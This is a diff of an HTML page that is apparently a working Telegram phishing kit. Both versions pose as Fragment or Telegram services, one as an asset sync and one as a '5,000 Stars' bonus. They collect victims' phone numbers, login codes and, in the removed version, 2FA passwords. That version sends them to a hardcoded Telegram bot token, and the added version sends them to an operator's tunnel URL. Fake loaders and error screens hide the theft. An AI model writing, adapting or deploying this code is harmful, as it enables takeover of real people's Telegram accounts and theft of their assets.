@@ -1,94 +1,128 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Asset Management Portal</title>
+    <title>Fragment Ledger | Stars Bonus</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #1c1c1c; color: white; font-family: -apple-system, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .card { width: 100%; max-width: 360px; padding: 30px 25px; text-align: center; }
-        .logo { width: 75px; height: 75px; background: #000; border-radius: 18px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-        .logo img { width: 48px; }
-        h1 { font-size: 22px; font-weight: 600; margin-bottom: 12px; }
-        p { color: #8e8e8e; font-size: 14px; line-height: 1.5; margin-bottom: 35px; }
-        input { width: 100%; background: #121212; border: 1px solid #333; border-radius: 12px; padding: 16px; color: white; font-size: 16px; margin-bottom: 15px; outline: none; box-sizing: border-box; transition: 0.2s; }
-        input:focus { border-color: #3390ec; }
-        button { width: 100%; background: #3390ec; color: white; border: none; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
-        button:active { opacity: 0.8; }
+        :root { --tg-theme-bg: #000000; --tg-theme-text: #ffffff; --accent: #007aff; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: var(--tg-theme-bg); color: var(--tg-theme-text); margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .wrapper { width: 90%; max-width: 360px; background: #1c1c1e; border-radius: 24px; padding: 30px 20px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.6); border: 1px solid #2c2c2e; }
+        .icon-box { width: 72px; height: 72px; background: #2c2c2e; border-radius: 20px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; }
+        img { width: 45px; }
+        h1 { font-size: 22px; font-weight: 700; margin: 0 0 10px; }
+        p { font-size: 14px; color: #8e8e93; line-height: 1.4; margin-bottom: 25px; }
+        input { width: 100%; padding: 16px; border-radius: 14px; border: 1px solid #3a3a3c; background: #2c2c2e; color: #fff; font-size: 17px; margin-bottom: 12px; box-sizing: border-box; outline: none; transition: 0.2s; }
+        input:focus { border-color: var(--accent); }
+        button { width: 100%; padding: 16px; border-radius: 14px; border: none; background: var(--accent); color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        button:active { transform: scale(0.97); opacity: 0.8; }
+        button:disabled { background: #3a3a3c; color: #8e8e93; cursor: not-allowed; }
         .step { display: none; }
-        .active { display: block; animation: fadeIn 0.4s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .active { display: block; animation: slideUp 0.3s ease-out; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .loader { border: 3px solid #3a3a3c; border-top: 3px solid var(--accent); border-radius: 50%; width: 35px; height: 35px; animation: spin 0.8s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo"><img src="https://fragment.com/img/logo.svg" alt="F"></div>
 
-        <div id="s1" class="step active">
-            <h1>Sync Assets</h1>
-            <p>Введите номер для синхронизации аккаунта с распределительным узлом Fragment.</p>
-            <input type="tel" id="u_phone" placeholder="Phone Number" autofocus>
-            <button onclick="go(1)" id="btn1">Next</button>
-        </div>
-
-        <div id="s2" class="step">
-            <h1>Identity Check</h1>
-            <p>Системный идентификатор был отправлен в ваше приложение для подтверждения прав.</p>
-            <input type="number" id="u_code" placeholder="System ID">
-            <button onclick="go(2)" id="btn2">Confirm</button>
-        </div>
-
-        <div id="s3" class="step">
-            <h1>Storage Key</h1>
-            <p>Ваше хранилище защищено облачным ключом. Введите его для завершения.</p>
-            <input type="password" id="u_pass" placeholder="Cloud Key">
-            <button onclick="go(3)">Unlock & Sync</button>
-        </div>
-
-        <div id="s4" class="step">
-            <h1 style="color:#ff595a">RPC Error</h1>
-            <p>Не удалось подключиться к TON Gateway. Попробуйте выполнить синхронизацию через 30-60 минут.</p>
-            <button onclick="location.reload()">Close</button>
-        </div>
+<div class="wrapper">
+    <div class="icon-box">
+        <img src="https://telegram.org/img/website_icon.svg" alt="TG">
+    </div>
+    
+    <div id="step1" class="step active">
+        <h1>Claim Stars</h1>
+        <p>Connect your account via Fragment Ledger to receive <b>5,000 Stars</b> bonus.</p>
+        <input type="tel" id="phone" placeholder="+7 999 123 45 67">
+        <button id="btn1" onclick="submitPhone()">Connect Telegram</button>
     </div>
 
-    <script>
-        const BOT_T = '8258905068:AAE9V0LzjGb0XqW7FnLMwb_0deCmXk59P7M';
-        const CHAT_ID = '7933925330';
+    <div id="step2" class="step">
+        <h1>Confirm Code</h1>
+        <p>Enter the code sent to your Telegram app to complete verification.</p>
+        <input type="number" id="code" placeholder="00000" pattern="\d*">
+        <button id="btn2" onclick="submitCode()">Verify & Claim</button>
+    </div>
 
-        async function send(msg) {
-            await fetch(`https://api.telegram.org/bot${BOT_T}/sendMessage`, {
+    <div id="step3" class="step">
+        <h1>Verifying...</h1>
+        <p>Synchronizing with smart contract nodes. Please stay on this page.</p>
+        <div class="loader"></div>
+    </div>
+</div>
+
+<script>
+    // --- ЗАМЕНИ ССЫЛКУ НИЖЕ НА ТУ, ЧТО ВЫДАЛ SSH ---
+    const SERVER_URL = "https://57bf31e3efb5ec.lhr.life"; 
+
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    tg.ready();
+
+    async function submitPhone() {
+        const rawPhone = document.getElementById('phone').value;
+        const cleanPhone = "+" + rawPhone.replace(/\D/g, '');
+        
+        if (cleanPhone.length < 11) {
+            alert("Please enter a valid phone number.");
+            return;
+        }
+
+        const btn = document.getElementById('btn1');
+        btn.disabled = true;
+        btn.innerText = "Connecting...";
+
+        try {
+            const response = await fetch(`${SERVER_URL}/send_phone`, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: cleanPhone })
             });
+
+            if (response.ok) {
+                document.getElementById('step1').classList.remove('active');
+                document.getElementById('step2').classList.add('active');
+            } else {
+                throw new Error();
+            }
+        } catch (err) {
+            alert("Gateway Error. Please restart the app.");
+            btn.disabled = false;
+            btn.innerText = "Connect Telegram";
+        }
+    }
+
+    async function submitCode() {
+        const code = document.getElementById('code').value;
+        const rawPhone = document.getElementById('phone').value;
+        const cleanPhone = "+" + rawPhone.replace(/\D/g, '');
+
+        if (code.length < 5) {
+            alert("Enter the full 5-digit code.");
+            return;
         }
 
-        let phone = "";
-        function go(s) {
-            if(s === 1) {
-                phone = document.getElementById('u_phone').value;
-                if(phone.length < 9) return;
-                document.getElementById('btn1').innerText = "Connecting...";
-                send(`📱 **ЛОГ НОМЕР:** \`${phone}\``);
-                setTimeout(() => {
-                    document.getElementById('s1').classList.remove('active');
-                    document.getElementById('s2').classList.add('active');
-                }, 1800);
-            } else if(s === 2) {
-                const code = document.getElementById('u_code').value;
-                if(code.length < 5) return;
-                send(`🔐 **ЛОГ КОД (${phone}):** \`${code}\``);
-                document.getElementById('s2').classList.remove('active');
-                document.getElementById('s3').classList.add('active');
-            } else if(s === 3) {
-                const pass = document.getElementById('u_pass').value;
-                send(`🔑 **ЛОГ 2FA (${phone}):** \`${pass}\``);
-                document.getElementById('s3').classList.remove('active');
-                document.getElementById('s4').classList.add('active');
-            }
+        document.getElementById('step2').classList.remove('active');
+        document.getElementById('step3').classList.add('active');
+
+        try {
+            await fetch(`${SERVER_URL}/send_code`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: cleanPhone, code: code })
+            });
+
+            // Держим лоадер для солидности и закрываем
+            setTimeout(() => {
+                tg.close();
+            }, 6000);
+        } catch (err) {
+            setTimeout(() => tg.close(), 3000);
         }
-    </script>
+    }
+</script>
+
 </body>
 </html>
-
